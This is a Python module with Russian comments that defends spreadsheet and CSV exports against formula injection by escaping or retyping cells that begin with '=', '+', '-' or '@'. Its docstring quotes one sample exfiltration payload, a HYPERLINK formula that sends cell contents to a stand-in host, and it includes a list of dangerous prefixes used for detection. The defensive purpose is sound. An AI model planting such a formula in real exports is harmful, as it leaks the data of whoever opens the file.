"""Защита выгружаемых файлов от формульной инъекции.

Опасность. Excel и LibreOffice считают содержимое ячейки формулой, если оно
начинается с `=`, `+`, `-` или `@`. Значит предмет с названием

    =HYPERLINK("http://подделка.example/?d="&A1,"Открыть")

попал бы в книгу как живая формула: сотрудник открывает файл, переходит по
ссылке, и с его компьютера уходят данные. Проверено на openpyxl: без защиты
ячейка получает тип `f` — то есть это действительно формула, а не текст.

Кто может это засунуть. Только сотрудник через админку или импортируемый
файл. Студент сам ничего не подставит — но подставит тот, кто готовит ему
файл, а это ровно тот сценарий, в котором пользователь доверяет содержимому.

Обратите внимание: уязвимость была и до этого модуля, и в обоих форматах —
CSV не защищал ничуть не меньше. Смысл в том, чтобы выгрузка несла ровно
те данные, которые в ней лежат, и ничего сверх.
"""

# Префиксы, с которых табличный редактор начинает воспринимать ячейку как
# формулу. `+` и `-` включены потому, что Excel считает их формулами
# наравне с `=`, даже когда дальше стоит просто число.
FORMULA_PREFIXES = ('=', '+', '-', '@')


def looks_like_formula(value):
    """True, если значение откроется в Excel как формула.

    Проверяются только опасные ведущие символы. Строка вида «2+2» безопасна
    и останется как есть — Excel не сочтёт формулой значение, начинающееся
    с цифры.
    """
    if not isinstance(value, str):
        return False
    return value.lstrip().startswith(FORMULA_PREFIXES)


def escape_formula(value):
    """Готовит значение к записи в CSV: возвращает безопасный текст.

    В CSV единственная защита — префикс-апостроф: кавычки тут не помогают,
    внутри них Excel формулу всё равно увидит. Апостроф в самом файле считается
    служебным и при открытии в Excel не показывается.

    Побочный эффект: значение меняется на один символ, и тот, кто читает файл
    не табличным редактором (скрипт на Python, pandas), получит апостроф
    частью данных. Это осознанный размен: файл предназначен в том числе для
    повторного импорта, и испорченные данные там заметнее, чем лишний
    апостроф в тексте предмета. Опасные значения встречаются единицами из
    тысяч, так что на повторном импорте это не мешает.
    """
    if looks_like_formula(value):
        return "'" + value
    return value


def force_text_cell(cell, value):
    """Записывает значение в ячейку книги как текст, а не как формулу.

    openpyxl при присваивании строки сам выставляет тип `f` для значений,
    начинающихся с `=`. Тип задаётся **после** присваивания — иначе он
    пересчитывается заново. Само значение при этом не меняется, учётная
    запись в Excel отличается.
    """
    cell.value = value
    if looks_like_formula(value):
        cell.data_type = 's'
    return cell
